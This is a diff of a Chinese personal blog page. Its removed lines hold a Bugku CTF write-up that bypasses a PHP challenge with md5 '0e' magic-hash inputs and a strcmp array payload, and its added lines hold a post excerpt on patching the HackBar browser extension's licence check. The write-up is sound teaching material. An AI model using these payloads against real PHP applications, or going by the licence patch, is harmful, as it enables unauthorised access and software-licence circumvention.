@@ -22,7 +22,7 @@
     <meta name="description" content="Loongten,keac,world">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>bugku-前女友(SKCTF) · keac&#39;s Blog</title>
+    <title>keac&#39;s Blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -203,23 +203,12 @@
 </head>
 
     
-        <body class="post-body">
-    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
-    
-    <div class="banner">
-            <div class="blog-title">
-                <a href="/">keac&#39;s Bolg.</a>
-            </div>
-            <div class="post-title">
-                <a href="#" class="post-name">bugku-前女友(SKCTF)</a>
-            </div>
-    </div>
     
     <a class="home-link" href="/">keac's Bolg.</a>
 </header>
@@ -231,76 +220,24 @@
 
 
 
-
-height:50vh;
 ">
     
     <!-- 主页  -->
-    
-    
-    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-img" style="background-image: url(/)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
-            
-            bugku-前女友(SKCTF)
-            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
-            
-            <!-- 404 -->
-            
         </p>
         <!-- 文章页meta -->
-        
-            <div class="post-intros">
-                <!-- 文章页标签  -->
-                
-                    <div class="post-intro-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="ctf">ctf</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="Bugku">Bugku</a>
-    
-</div>
-                
-                
-                    <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">262</span>阅读时长: <span class="post-count reading-time">1 min</span></span>
-                    </div>
-                
-                <div class="post-intro-meta">
-                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2019/06/09</span>
-                    
-                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
-                        <span class="iconfont-archer">&#xe602;</span>
-                        <span id="busuanzi_value_page_pv"></span>
-                    </span>
-                    
-                    <span class="shareWrapper">
-                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
-                        <span class="shareText">Share</span>
-                        <ul class="shareList">
-                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
-                                <div class="share-qrcode"></div>
-                            </li>
-                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
-                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
-                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
-                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
-                        </ul>
-                    </span>
-                </div>
-            </div>
         
     </div>
 </div>
@@ -401,69 +338,53 @@ height:50vh;
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main post-page">
-    <article class="article-entry">
-        <p>今天做了一道BugKu的简单题，来记录下</p>
-<p><img src="1.png" alt="1"></p>
-<p>打开链接第一反应打开F12查看下源码里面有什么东西</p>
-<p>果然有玄机，这个CSS写的..<br><img src="2.png" alt="1"></p>
-<p>打开 code.txt</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> if(isset($_GET[&apos;v1&apos;]) &amp;&amp; isset($_GET[&apos;v2&apos;]) &amp;&amp; isset($_GET[&apos;v3&apos;]))&#123;</span><br><span class="line">    $v1 = $_GET[&apos;v1&apos;];</span><br><span class="line">    $v2 = $_GET[&apos;v2&apos;];</span><br><span class="line">    $v3 = $_GET[&apos;v3&apos;];</span><br><span class="line">    if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123;</span><br><span class="line">        if(!strcmp($v3, $flag))&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>大致意思就是接受三个参数，v1 和 v2 的md5值相等内容不相等，可以看到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5($v1) == md5($v2)</span><br></pre></td></tr></table></figure></p>
-<p>两个用了==，可以用PHP弱类型来绕过</p>
-<p>分享一波 md5 0e 开头的</p>
-<p>纯数字类：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">240610708 0e462097431906509019562988736854</span><br><span class="line">314282422 0e990995504821699494520356953734</span><br><span class="line">571579406 0e972379832854295224118025748221</span><br><span class="line">903251147 0e174510503823932942361353209384</span><br><span class="line">1110242161 0e435874558488625891324861198103</span><br><span class="line">1320830526 0e912095958985483346995414060832</span><br><span class="line">1586264293 0e622743671155995737639662718498</span><br><span class="line">2302756269 0e250566888497473798724426794462</span><br><span class="line">2427435592 0e067696952328669732475498472343</span><br><span class="line">2653531602 0e877487522341544758028810610885</span><br><span class="line">3293867441 0e471001201303602543921144570260</span><br><span class="line">3295421201 0e703870333002232681239618856220</span><br><span class="line">3465814713 0e258631645650999664521705537122</span><br><span class="line">3524854780 0e507419062489887827087815735195</span><br><span class="line">3908336290 0e807624498959190415881248245271</span><br><span class="line">4011627063 0e485805687034439905938362701775</span><br><span class="line">4775635065 0e998212089946640967599450361168</span><br><span class="line">4790555361 0e643442214660994430134492464512</span><br><span class="line">5432453531 0e512318699085881630861890526097</span><br><span class="line">5579679820 0e877622011730221803461740184915</span><br><span class="line">5585393579 0e664357355382305805992765337023</span><br><span class="line">6376552501 0e165886706997482187870215578015</span><br><span class="line">7124129977 0e500007361044747804682122060876</span><br><span class="line">7197546197 0e915188576072469101457315675502</span><br><span class="line">7656486157 0e451569119711843337267091732412</span><br></pre></td></tr></table></figure></p>
-<p>大写字母类<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">QLTHNDT 0e405967825401955372549139051580</span><br><span class="line">QNKCDZO 0e830400451993494058024219903391</span><br><span class="line">EEIZDOI 0e782601363539291779881938479162</span><br><span class="line">TUFEPMC 0e839407194569345277863905212547</span><br><span class="line">UTIPEZQ 0e382098788231234954670291303879</span><br><span class="line">UYXFLOI 0e552539585246568817348686838809</span><br><span class="line">IHKFRNS 0e256160682445802696926137988570</span><br><span class="line">PJNPDWY 0e291529052894702774557631701704</span><br><span class="line">ABJIHVY 0e755264355178451322893275696586</span><br><span class="line">DQWRASX 0e742373665639232907775599582643</span><br><span class="line">DYAXWCA 0e424759758842488633464374063001</span><br><span class="line">GEGHBXL 0e248776895502908863709684713578</span><br><span class="line">GGHMVOE 0e362766013028313274586933780773</span><br><span class="line">GZECLQZ 0e537612333747236407713628225676</span><br><span class="line">NWWKITQ 0e763082070976038347657360817689</span><br><span class="line">NOOPCJF 0e818888003657176127862245791911</span><br><span class="line">MAUXXQC 0e478478466848439040434801845361</span><br><span class="line">MMHUWUV 0e701732711630150438129209816536</span><br></pre></td></tr></table></figure></p>
-<p>接下来是 strcmp<br><img src="3.png" alt="1"></p>
-<p>用数组绕过即可，于是构造 payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=240610708&amp;v2=314282422&amp;v3[]=123</span><br></pre></td></tr></table></figure>
-<p>发现在下面flag已经出来了<br><img src="4.png" alt="1"></p>
-<p>Flag: SKCTF{Php_1s_tH3_B3St_L4NgUag3}</p>
-
-    </article>
-    <!-- license  -->
+            <main class="main index-page">
     
-        <div class="license-wrapper">
-            <p>原文作者：<a href="http://www.loongten.com">keacwu</a>
-            </p><p>原文链接：<a href="http://www.loongten.com/2019/06/09/bugku-前女友-SKCTF/">http://www.loongten.com/2019/06/09/bugku-前女友-SKCTF/</a>
-            </p><p>发表日期：<a href="http://www.loongten.com/2019/06/09/bugku-前女友-SKCTF/">June 9th 2019, 2:05:43 pm</a>
-            </p><p>更新日期：<a href="http://www.loongten.com/2019/06/09/bugku-前女友-SKCTF/">June 9th 2019, 3:37:10 pm</a>
-            </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href="/2019/06/30/hackbar/">
+            
+                <span>hackbar</span>
+        </a>
+        <div class="abstract-content">
+            HackBar 收费了 一直没去弄
+来记录下
+chrome由于Chrome的自动更新机制，一旦插件更新，需要重新来一遍，文件夹的版本号要看好了
+先打开开发者模式
+
+在这里1C:\Users\用户名\AppData\Local\Google\Chrome\User Data\Default\Extensions\djmoeoifnlhjolebkehmpaocfnipknbh\2.2.6_0\theme\js
+
+大约在25行的位置改为true
+
+现在可以用了，如果红色的条条烦 可以点save 就没了
+
+firefox不过firefox 的插件有签名，不能改
+https://github.c...
         </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/06/30</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class="abstract-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="hackbar">hackbar</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="许可证">许可证</a>
+    
+</div>
+            
+        </div>
+    </article>
     
     <!-- paginator  -->
-    <ul class="post-paginator">
-        <li class="next">
-            
-                <div class="nextSlogan">Next Post</div>
-                <a href="/2019/06/09/bugku-你从哪里来/" title="bugku-你从哪里来">
-                    <div class="nextTitle">bugku-你从哪里来</div>
-                </a>
-            
-        </li>
-        <li class="previous">
-            
-                <div class="prevSlogan">Previous Post</div>
-                <a href="/2019/06/08/pi-screen/" title="树莓派分辨率调整">
-                    <div class="prevTitle">树莓派分辨率调整</div>
-                </a>
-            
-        </li>
-    </ul>
-    <!-- 评论插件 -->
-    <!-- 来必力City版安装代码 -->
-
-<!-- City版安装代码已完成 -->
     
-    
-    <!-- partial('_partial/comment/changyan') -->
-    <!--PC版-->
-
-
-    
-    
-
-    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -545,24 +466,6 @@ height:50vh;
 </footer>
     </div>
     <!-- toc -->
-    
-    <div class="toc-wrapper" style=
-    
-
-
-
-
-
-
-
-top:50vh;
-
-    >
-        <div class="toc-catalog">
-            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
-        </div>
-        
-    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -950,8 +853,6 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
-    
-        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
